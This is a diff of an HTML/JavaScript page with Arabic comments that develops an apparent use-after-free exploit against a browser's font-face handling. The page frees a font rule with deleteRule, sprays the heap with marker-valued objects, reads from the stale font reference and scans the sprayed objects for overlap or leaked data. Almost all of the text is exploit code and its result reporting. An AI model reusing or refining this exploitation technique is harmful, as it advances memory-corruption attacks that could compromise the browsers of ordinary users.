@@ -5,7 +5,8 @@
 @font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
 </style>
 </head>
-<body style="background: black; color: white; font-family: monospace;">
+<body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
+    <div id="out">جاري فحص حالة الاستبدال...</div>
 
 <script>
 window.onload = () => {
@@ -26,29 +27,44 @@ window.onload = () => {
                     // 1. تحرير كائن الخط
                     document.getElementById('s').sheet.deleteRule(0);
                     
-                    // 2. محاولة ملء الفراغ بكائنات جافا سكريبت ذات خصائص مكررة لشغل نفس الحجم
-                    // نضع قيم رقمية مميزة (مثل 0x1337) لنرى هل يمكننا قراءتها لاحقاً
+                    // 2. ملء الفراغ بكائنات ذات مؤشرات دلالية ومعرفات فريدة (ID)
                     for (let i = 0; i < 200; i++) {
-                        let obj = {
-                            prop1: 0x13371337,
-                            prop2: 0x13371337,
-                            prop3: A, // إبقاء مرجع للكائن الأصلي
-                            id: i
-                        };
-                        structures.push(obj);
+                        structures.push({
+                            p1: 0x24242424,
+                            p2: 0x24242424,
+                            id: i,
+                            marker: 0x77777777 // علامة فريدة للبحث عنها في الذاكرة
+                        });
                     }
                     
-                    // 3. فصل التنفيذ للسماح للمتصفح بإعادة ترتيب الذاكرة (Grooming)
+                    // 3. فحص الذاكرة بشكل مستقر
                     setTimeout(() => {
+                        let leakedIndex = -1;
+                        
                         try {
-                            // محاولة استدعاء خاصية مجدداً لإجبار المتصفح على القراءة من الكائن المستبدل
-                            let check = A.family; 
+                            // محاولة تفعيل قراءة للتحقق من تغير خصائص الكائن المستهدف
+                            let currentFamily = A.family;
                             
-                            // إذا استقر المتصفح وقرأ دون انهيار، نغير اللون للأزرق
-                            document.body.style.background = "blue";
+                            // فحص مصفوفة الكائنات لرؤية ما إذا كان أحدها قد تأثر بالتحرير
+                            for (let j = 0; j < structures.length; j++) {
+                                // إذا تغيرت حالة أحد الكائنات أو تداخل مع مرجع الكائن A
+                                if (structures[j].id !== j) {
+                                    leakedIndex = j;
+                                    break;
+                                }
+                            }
+                            
+                            if (leakedIndex !== -1) {
+                                document.body.style.background = "purple";
+                                document.getElementById("out").innerText = "تم رصد التداخل في الكائن رقم: " + leakedIndex;
+                            } else {
+                                document.body.style.background = "blue";
+                                document.getElementById("out").innerText = "الاستبدال مستقر (وضع القراءة آمن)، لم يتم رصد تداخل مباشر في المعرفات بعد.";
+                            }
+                            
                         } catch(e) {
-                            // إذا حدث خطأ برمجي عادي وليس انهيار متصفح
                             document.body.style.background = "red";
+                            document.getElementById("out").innerText = "خطأ أثناء الفحص: " + e.message;
                         }
                     }, 0);
                 }
